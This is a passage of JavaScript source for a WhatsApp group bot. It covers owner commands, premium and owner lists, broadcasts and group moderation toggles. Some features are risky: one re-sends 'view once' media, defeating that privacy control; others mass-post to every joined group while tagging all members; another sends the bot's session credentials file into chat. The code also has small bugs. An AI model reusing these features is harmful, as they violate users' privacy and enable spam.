 return buffer;
 } catch (error) {
 console.error('Ошибка:', error.message);
 return null;
 }
 }
}

//bisa kalian koreksi lagi karna scrape pin down nya support image
const pinterest = new Pinterest();
let hann = await pinterest.getBuffer(text)
Yasam.sendMessage(m.chat, { image: hann, caption: "Tuh ayang" })
}
break

case 'addbadword': case 'addbd':
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!groupAdmins) return replygcxeon(mess.admin)
 if (args.length < 1) return replygcxeon( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
 bad.push(q)
 fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
 replygcxeon('Successfully Added Bad Word!')
 break
 case 'delbadword': case 'deldb':
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!groupAdmins) return replygcxeon(mess.admin)
 if (args.length < 1) return replygcxeon( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`) 
 bad.splice(q)
 fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
 replygcxeon('Successfully Deleted Bad Word!')
 break 
 case 'resetuser':
 case 'resetdbuser': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 let totalusernya = db.data.users[0]
 replygcxeon(`Succesfully Deleted ${totalusernya} Users in Database`)
 db.data.users = []
 }
 break
 case 'resethit':
 case 'resettotalhit': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 global.db.data.settings[botNumber].totalhit = 0
 replygcxeon(mess.done)
 }
 break
 case 'setmenu':{
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!text) return replygcxeon(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12)\nPlease select one\nExample ${prefix + command} v1`)
 if (text.startsWith('v')) {
 typemenu = text
 replygcxeon(mess.done)
 } else {
 replygcxeon(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12)\nPlease select one\nExample ${prefix + command} v1`)
 }
 }
 break
 case 'setreply':{
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!text) return replygcxeon(`There are 3 reply(v1,v2,v3,v4)\nPlease select 1\nExample ${prefix+command} v1`)
 if (text.startsWith('v')) {
 typereply = text
 replygcxeon(mess.done)
 } else {
 replygcxeon(`There are 3 reply(v1,v2,v3,v4)\nPlease select 1\nExample ${prefix+command} v1`)
 }
 }
 break

case 'setimgmenu':
 case 'sim': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 m.reply('Reply gambarnya kak')
 let delb = await Yasam.downloadAndSaveMediaMessage(quoted)
 await fsx.copy(delb, './XeonMedia/theme/cheemspic.jpg')
 fs.unlinkSync(delb)
 replygcxeon(mess.done)
 }
 break
 case 'setvidmenu':
 case 'svm': 
 	case 'setvgifmenu':
 case 'sgm': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 m.reply('reply videonya kak')
 let delb = await Yasam.downloadAndSaveMediaMessage(quoted)
 await fsx.copy(delb, './XeonMedia/theme/Cheems-bot.mp4')
 fs.unlinkSync(delb)
 replygcxeon(mess.done)
 }
 break
 case 'addtitle':{
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!text) return replygcxeon(`Usage ${prefix + command} number|title`)
 nonya = text.split('|')[0]
 titlenya = text.split('|')[1]
 let oo = `${nonya}@s.whatsapp.net`
 db.data.users[oo].title = titlenya
 await replygcxeon(mess.done)
 }
 break
 case 'deltitle':{
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!text) return replygcxeon(`Usage ${prefix + command} number`)
 nonya = text.split(',')[0]
 let oo = `${nonya}@s.whatsapp.net`
 db.data.users[oo].title = ''
 await replygcxeon(mess.done)
 }
 break
 case 'addlimit':
 case 'givelimit':{
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!text) return replygcxeon(`Usage ${prefix + command} number|limit amount`)
 usernya = text.split('|')[0]
 limitnya = text.split('|')[1]
 let oo = `${usernya}@s.whatsapp.net`
 db.data.users[oo].limit += limitnya
 replygcxeon(mess.done)
 }
 break
 case 'dellimit':{
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!text) return replygcxeon(`Usage ${prefix + command} number|limit amount`)
 usernya = text.split('|')[0]
 limitnya = text.split('|')[1]
 if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return replygcxeon(`His Limit Is Less Than ${limitnya}`)
 db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
 replygcxeon(mess.done)
 }
 break
 case 'addprem':
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (args.length < 2)
 return replygcxeon(`Usage ${prefix + command} @tag time\n${prefix + command} number time\n\nExample : ${prefix + command} @tag 30d`)
 if (m.mentionedJid.length !== 0) {
 for (let i = 0; i < m.mentionedJid.length; i++) {
 addPremiumUser(m.mentionedJid[0], args[1], premium)
 }
 replygcxeon("Premium Success")
 } else {
 addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
 replygcxeon("Premium Success")
 }
 break
 case 'delprem':
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (args.length < 1) return replygcxeon(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 916909137213`)
 if (m.mentionedJid.length !== 0) {
 for (let i = 0; i < m.mentionedJid.length; i++) {
 premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
 fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
 }
 replygcxeon("Delete Success")
 } else {
 premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
 fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
 replygcxeon("Delete Success")
 }
 break
 case 'listprem': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 let data = require('./src/data/role/premium.json')
 let txt = `*------「 LIST PREMIUM 」------*\n\n`
 for (let x of data) {
 txt += `Number : ${x.id}\n`
 txt += `Expire In: ${x.expired} ms\n`
 Yasam.sendMessage(m.chat, {
 text: txt,
 mentions: x
 }, {
 quoted: fvrif
 })
 }
 }
 break
case 'addowner':
if (!YasamCreator) return replygcxeon (mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Yasam.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcxeon(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!YasamCreator) return replygcxeon (mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
 let teks = '┌──⭓「 *List Owner* 」\n│\n'
 for (let x of owner) {
 teks += `│⭔ ${x}\n`
 }
 teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
 replygcxeon(teks)
 }
 break
 case 'delsession':
 case 'clearsession': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 fs.readdir("./session", async function(err, files) {
 if (err) {
 console.log('Unable to scan directory: ' + err);
 return replygcxeon('Unable to scan directory: ' + err);
 }
 let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
 item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
 )
 console.log(filteredArray.length);
 let teks = `Detected ${filteredArray.length} junk files\n\n`
 if (filteredArray.length == 0) return replygcxeon(teks)
 filteredArray.map(function(e, i) {
 teks += (i + 1) + `. ${e}\n`
 })
 replygcxeon(teks)
 await sleep(2000)
 replygcxeon("Deleting junk files...")
 await filteredArray.forEach(function(file) {
 fs.unlinkSync(`./session/${file}`)
 });
 await sleep(2000)
 replygcxeon("Successfully deleted all the trash in the session folder")
 });
 }
 break
 case 'join':
 try {
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!text) return replygcxeon('Enter Group Link!')
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!')
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 Yasam.groupAcceptInvite(result)
 await replygcxeon(`Done`)
 } catch {
 replygcxeon('Failed to join the Group')
 }
 break
 case 'getsession':
 if (!YasamCreator) return replygcxeon (mess.owner)
 replygcxeon('Wait a moment, currently retrieving your session file')
 let sesi = fs.readFileSync('./session/creds.json')
 Yasam.sendMessage(m.chat, {
 document: sesi,
 mimetype: 'application/json',
 fileName: 'creds.json'
 }, {
 quoted: fvrif
 })
 break
 case 'myip':
 case 'ipbot':
 if (!YasamCreator) return replygcxeon (mess.owner)
 var http = require('http')
 http.get({
 'host': 'api.ipify.org',
 'port': 80,
 'path': '/'
 }, function(resp) {
 resp.on('data', function(ip) {
 replygcxeon("🔎 My public IP address is: " + ip);
 })
 })
 break
 case 'request': case 'reportbug': {
	if (!text) return replygcxeon(`Example : ${
 prefix + command
 } hi dev play command is not working`)
 textt = `*| REQUEST/BUG |*`
 teks1 = `\n\n*User* : @${
 m.sender.split("@")[0]
 }\n*Request/Bug* : ${text}`
 teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
 for (let i of owner) {
 Yasam.sendMessage(i + "@s.whatsapp.net", {
 text: textt + teks1,
 mentions: [m.sender],
 }, {
 quoted: fvrif,
 })
 }
 Yasam.sendMessage(m.chat, {
 text: textt + teks2 + teks1,
 mentions: [m.sender],
 }, {
 quoted: fvrif,
 })

 }
 break
 case 'autoread':
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
 if (q === 'on') {
 db.data.settings[botNumber].autoread = true
 replygcxeon(`Successfully changed autoread to ${q}`)
 } else if (q === 'off') {
 db.data.settings[botNumber].autoread = false
 replygcxeon(`Successfully changed autoread to ${q}`)
 }
 break
 case 'unavailable':
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
 if (q === 'on') {
 db.data.settings[botNumber].online = true
 replygcxeon(`Successfully changed unavailable to ${q}`)
 } else if (q === 'off') {
 db.data.settings[botNumber].online = false
 replygcxeon(`Successfully changed unavailable to ${q}`)
 }
 break
 case 'autorecordtype':
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
 if (q === 'on') {
 db.data.settings[botNumber].autorecordtype = true
 replygcxeon(`Successfully changed Auto-RecordingTyping to ${q}`)
 } else if (q === 'off') {
 db.data.settings[botNumber].autorecordtype = false
 replygcxeon(`Successfully changed Auto-RecordingTyping to ${q}`)
 }
 break

case 'autorecord':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (args.length < 1) return replygcxeon(`Contoh: ${prefix + command} on/off`);
				if (q === 'on') {
					db.data.settings[botNumber].autorecord = true;
					replygcxeon(`Auto-record berhasil diubah ke ${q}, jadi semua aktivitas terrekam otomatis!`);
				} else if (q === 'off') {
					db.data.settings[botNumber].autorecord = false;
					replygcxeon(`Auto-record dimatikan, gak bakal ada rekaman otomatis lagi!`);
				}
			break;
 case 'autotype':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (args.length < 1) return replygcxeon(`Contoh: ${prefix + command} on/off`);
				if (q === 'on') {
					db.data.settings[botNumber].autotype = true;
					replygcxeon(`Auto-typing berhasil diubah ke ${q}, jadi bot bakal ngetik otomatis deh!`);
				} else if (q === 'off') {
					db.data.settings[botNumber].autotype = false;
					replygcxeon(`Auto-typing dimatikan, jadi bot gak bakal ngetik otomatis lagi!`);
				}
			break;
 case 'autobio':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (args.length < 1) return replygcxeon(`Contoh: ${prefix + command} on/off`);
				if (q == 'on') {
					db.data.settings[botNumber].autobio = true;
					replygcxeon(`Yay! AutoBio berhasil diubah ke ${q}, biografi otomatis aktif!`);
				} else if (q == 'off') {
					db.data.settings[botNumber].autobio = false;
					replygcxeon(`Oke, AutoBio berhasil dimatikan. Gak ada lagi bio otomatis nih!`);
				}
			break;
			case 'autosticker':
			case 'autostickergc':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (args.length < 1) return replygcxeon(`Contoh: ${prefix + command} on/off`);
				if (q == 'on') {
					db.data.settings[botNumber].autosticker = true;
					replygcxeon(`Sticker otomatis berhasil diubah ke ${q}, jadi semuanya bakal jadi sticker!`);
				} else if (q == 'off') {
					db.data.settings[botNumber].autosticker = false;
					replygcxeon(`Sticker otomatis dimatikan, gak ada sticker otomatis lagi deh!`);
				}
			break;
			case 'safesearch': {
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (args.length < 1) return replygcxeon(`🛡️ Contoh penggunaan:\n${prefix + command} on/off`);
				if (q === 'on') {
					db.data.settings[botNumber].safesearch = true;
					replygcxeon(`🛡️ *SafeSearch Shield* berhasil diaktifkan!\nSekarang bot akan menjaga chat dari konten yang tidak pantas. 😊`);
				} else if (q === 'off') {
					db.data.settings[botNumber].safesearch = false;
					replygcxeon(`🛡️ *SafeSearch Shield* berhasil dimatikan.\nFitur perlindungan konten tidak aktif untuk saat ini.`);
				} else {
					replygcxeon(`⚠️ Opsi tidak valid! Gunakan *on* untuk mengaktifkan atau *off* untuk mematikan.`);
				}
			}
			break; 
 case 'autodownload':
			case 'autodl':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (args.length < 1) return replygcxeon(`Contoh: ${prefix + command} on/off`);
				if (q == 'on') {
					db.data.settings[botNumber].autodownload = true;
					replygcxeon(`Download otomatis berhasil diubah ke ${q}, jadi file bakal langsung terunduh otomatis!`);
				} else if (q == 'off') {
					db.data.settings[botNumber].autodownload = false;
					replygcxeon(`Download otomatis dimatikan, jadi file gak bakal langsung terunduh lagi!`);
				}
			break;
			case 'autoblock':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (args.length < 1) return replygcxeon(`Contoh: ${prefix + command} on/off`);
				if (q == 'on') {
					db.data.settings[botNumber].autoblocknum = true;
					replygcxeon(`Auto-Block berhasil diubah ke ${q}, jadi nomor yang mencurigakan bakal diblokir otomatis!`);
				} else if (q == 'off') {
					db.data.settings[botNumber].autoblocknum = false;
					replygcxeon(`Auto-Block dimatikan, jadi gak bakal ada pemblokiran otomatis lagi!`);
				}
			break;
			case 'onlygroup':
			case 'onlygc':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (args.length < 1) return replygcxeon(`Contoh: ${prefix + command} on/off`);
				if (q == 'on') {
					db.data.settings[botNumber].onlygc = true;
					replygcxeon(`Yeay! Onlygroup berhasil diubah ke ${q}, sekarang bot hanya bisa dipakai di grup aja!`);
				} else if (q == 'off') {
					db.data.settings[botNumber].onlygc = false;
					replygcxeon(`Oke, Onlygroup berhasil dimatikan, jadi bot bisa dipakai di mana saja deh!`);
				}
			break;
			case 'onlyprivatechat':
			case 'onlypc':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (args.length < 1) return replygcxeon(`Contoh: ${prefix + command} on/off`);
				if (q == 'on') {
					db.data.settings[botNumber].onlypc = true;
					replygcxeon(`Yeay! Only-Pc berhasil diubah ke ${q}, sekarang bot hanya bisa dipakai di chat pribadi!`);
				} else if (q == 'off') {
					db.data.settings[botNumber].onlypc = false;
					replygcxeon(`Oke, Only-Pc dimatikan, jadi bot bisa dipakai di grup juga deh!`);
				}
			break;
 case 'onlyindianumber':
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
 if (q == 'on') {
 db.data.settings[botNumber].onlyindia = true
 replygcxeon(`Successfully Changed Only-Indian To ${q}`)
 } else if (q == 'off') {
 db.data.settings[botNumber].onlyindia = false
 replygcxeon(`Successfully Changed Only-Indian To ${q}`)
 }
 break
 case 'onlyindo':
 case 'onlyindonumber':
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
 if (q == 'on') {
 db.data.settings[botNumber].onlyindo = true
 replygcxeon(`Successfully Changed Only-Indonesian To ${q}`)
 } else if (q == 'off') {
 db.data.settings[botNumber].onlyindo = false
 replygcxeon(`Successfully Changed Only-Indonesian To ${q}`)
 }
 break
 case 'self':
				if (!YasamCreator) return replygcxeon(mess.owner);
				Yasam.public = false;
				replygcxeon(`Bot sekarang dalam mode *Self Usage* aja, gak bisa dipakai oleh orang lain ya!`);
			break;
			case 'public':
				if (!YasamCreator) return replygcxeon(mess.owner);
				Yasam.public = true;
				replygcxeon(`Bot sekarang kembali ke mode *Public Usage*, jadi bisa dipakai semua orang!`);
			break;
			case 'setexif':
			case 'setwm':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (!text) return replygcxeon(`Contoh: ${prefix + command} packname|author`);
				global.packname = text.split("|")[0];
				global.author = text.split("|")[1];
				replygcxeon(`Yeay! Exif berhasil diubah! 🎉\n\n• Packname: ${global.packname}\n• Author: ${global.author}`);
			break;
			case 'setprefix':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (!text) return replygcxeon(`Contoh: ${prefix + command} packname|author`);
				global.prefix= text;
				replygcxeon(`Prefix berhasil diubah menjadi ${text} ✨`);
			break;
			case 'setautoblock':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (!text) return replygcxeon(`Contoh: ${prefix + command} packname|author`);
				global.autoblocknumber = text;
				replygcxeon(`Auto-Block number berhasil diubah menjadi ${text} 🚫`);
			break;
			case 'setantiforeign':
				if (!YasamCreator) return replygcxeon(mess.owner);
				if (!text) return replygcxeon(`Contoh: ${prefix + command} packname|author`);
				global.antiforeignnumber = text;
				replygcxeon(`Anti-foreign number berhasil diubah menjadi ${text} 🌍❌`);
			break;
 case 'setbotpp':
 case 'setpp':
 case 'setpp':
 case 'setppbot':
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!quoted) return replygcxeon(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
 if (!/image/.test(mime)) return replygcxeon(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
 if (/webp/.test(mime)) return replygcxeon(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
 var medis = await Yasam.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
 if (args[0] == 'full') {
 var {
 img
 } = await generateProfilePicture(medis)
 await Yasam.query({
 tag: 'iq',
 attrs: {
 to: botNumber,
 type: 'set',
 xmlns: 'w:profile:picture'
 },
 content: [{
 tag: 'picture',
 attrs: {
 type: 'image'
 },
 content: img
 }]
 })
 fs.unlinkSync(medis)
 replygcxeon(mess.done)
 } else {
 var memeg = await Yasam.updateProfilePicture(botNumber, {
 url: medis
 })
 fs.unlinkSync(medis)
 replygcxeon(mess.done)
 }
 break
 case 'leave':
 case 'out':
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!m.isGroup) return replygcxeon (mess.group)
 replygcxeon('Selamat tinggal, semuanya 🥺');
 await Yasam.groupLeave(m.chat)
 break
 case 'bc':
 case 'broadcast': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!text) return replygcxeon('Text?')
 let teksnya = `${text}`
 for (let i of Object.keys(global.db.data.users)) {
 await sleep(1500)
 if (/image/.test(mime)) {
 var media = await quoted.download()
 await Yasam.sendMessage(i, { 
 image:media,
 caption: teksnya
 })
 } else if (/video/.test(mime)) {
 var media = await quoted.download()
 await Yasam.sendMessage(i, {
 video: media,
 caption: teksnya
 })
 } else if (text) {
 await Yasam.sendMessage(i, {
 text: teksnya
 })
 }
 }
 replygcxeon(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
 }
 break
 case 'jpm': case 'post': {
if (!YasamCreator) return replygcxeon (mess.owner)
if (!text) return replygcxeon(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
await replygcxeon(`Waiting in progress`)
let getGroups = await Yasam.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Yasam.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Yasam.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Yasam.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Yasam.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
replygcxeon(`Success`)
}
break

case 'block':{
		if (!YasamCreator) return replygcxeon (mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Yasam.updateBlockStatus(users, 'block')
		await replygcxeon(`Done`)
	}
	break
	case 'unblock':{
		if (!YasamCreator) return replygcxeon (mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Yasam.updateBlockStatus(users, 'unblock')
		await replygcxeon(`Done`)
	}
	break
 case 'bcgc':
 case 'bcgroup': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!text) return replygcxeon(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
 let getGroups = await Yasam.groupFetchAllParticipating()
 let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
 let anu = groups.map(v => v.id)
 replygcxeon(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
 for (let i of anu) {
 await sleep(1500)
 let a = `${text}`
 Yasam.sendMessage(i, {
 text: a,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: botname,
 body: `Sent in ${i.length} Group`,
 thumbnailUrl: 'https://files.catbox.moe/hblt6n.jpg',
 sourceUrl: wagc,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 })
 }
 replygcxeon(`Successful in sending Broadcast To ${anu.length} Group`)
 }
 break
 case 'getcase':
 if (!YasamCreator) return replygcxeon (mess.owner)
 try {
 const getCase = (cases) => {
 return "case" + `'${cases}'` + fs.readFileSync("XeonCheems13.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
 }
 replygcxeon(`${getCase(q)}`)
 } catch {
 replygcxeon(`case ${q} not found!`)
 }
 break
 //group
 case 'antibadword':
 case 'antitoxic':{
		 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].badword = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].badword = false
 replygcxeon(`${commad} is disabled`)
 }
 }
 break
 case 'react': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 reactionMessage = {
 react: {
 text: args[0],
 key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
 }
 }
 Yasam.sendMessage(m.chat, reactionMessage)
 }
 break
 case 'nsfw': {
if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
if (args[0] === "on") {
if (AntiNsfw) return replygcxeon('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
replygcxeon('Success in turning on nsfw in this group')
var groupe = await Yasam.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Yasam.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcxeon('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
replygcxeon('Success in turning off nsfw in this group')
} else {
 await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
 }
 }
 break
 case 'userjid':
 case 'jid':
 case 'groupjid':
 case 'id':{
 replygcxeon(from)
 }
 break
 case 'antiaudio':{
 	if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antiaudio = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antiaudio = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antiforeign':{
 	if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[m.chat].antiforeignnum = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[m.chat].antiforeignnum = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'poll': {
	if (!YasamCreator) return replygcxeon (mess.owner)
 let [poll, opt] = text.split("|")
 if (text.split("|") < 2)
 return await replygcxeon(
 `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
 )
 let options = []
 for (let i of opt.split(',')) {
 options.push(i)
 }
 await Yasam.sendMessage(m.chat, {
 poll: {
 name: poll,
 values: options
 }
 })
 }
 break
 case 'antipoll':{
 	if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antipoll = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antipoll = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antisticker':{
 	if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antisticker = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antisticker = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antiimage':{
 	if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antiimage = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antiimage = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antivideo':{
 	if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antivideo = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antivideo = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antivirtex':{
		 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antivirtex = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antivirtex = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'antibot':{
		 if (!m.isGroup) return replygcxeon (mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 db.data.chats[from].antibot = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 db.data.chats[from].antibot = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'rvo':
 case 'readviewonce': {
	if (!m.quoted) return replygcxeon(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcxeon(`This is not a view once message`)
 let msg = m.quoted.message
 let type = Object.keys(msg)[0]
 let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
 let buffer = Buffer.from([])
 for await (const chunk of media) {
 buffer = Buffer.concat([buffer, chunk])
 }
 if (/video/.test(type)) {
 return Yasam.sendFile(m.sender, buffer, 'media.mp4', msg[type].caption || '', m)
 } else if ( /audio/.testi(type)) {
 	return Yasam.sendFile(m.sender, buffer, 'audio/mp4', msg[type].caption || '', m) 
 } else if (/image/.test(type)) { 
